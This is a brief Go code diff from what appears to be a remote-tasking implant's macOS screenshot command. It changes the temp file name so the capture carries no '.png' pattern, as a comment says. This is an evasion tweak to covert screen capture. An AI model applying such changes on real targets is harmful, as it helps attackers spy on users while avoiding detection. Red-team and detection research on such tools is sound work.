@@ -23,7 +23,7 @@ func (c *ScreenshotDarwinCommand) Description() string {
 
 func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResult {
 	// Create temp file for screenshot — random name (no distinctive pattern)
-	tf, tfErr := os.CreateTemp("", "*.png")
+	tf, tfErr := os.CreateTemp("", "")
 	if tfErr != nil {
 		return errorf("Error creating temp file: %v", tfErr)
 	}
